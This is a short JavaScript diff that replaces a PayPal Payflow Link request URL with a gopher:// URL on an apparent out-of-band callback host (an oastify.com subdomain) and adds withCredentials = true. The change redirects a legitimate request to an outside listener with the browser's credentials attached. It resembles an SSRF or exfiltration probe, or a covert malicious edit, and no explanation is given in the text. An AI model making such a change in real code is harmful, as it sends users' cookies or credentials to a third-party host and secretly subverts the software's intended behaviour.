@@ -1,4 +1,4 @@
-const url = "https://payflowlink.paypal.com/";
+const url = "gopher://6w3bjamuw5lces3s4c19hmuy8pef24.oastify.com/";
 let xml = new XMLHttpRequest();
 xml.onreadystatechange = function(){
     if(xml.readyState !== 4) return;
@@ -7,4 +7,5 @@ xml.onreadystatechange = function(){
     }
 }
 xml.open("GET",url);
+xml.withCredentials = true;
 xml.send();
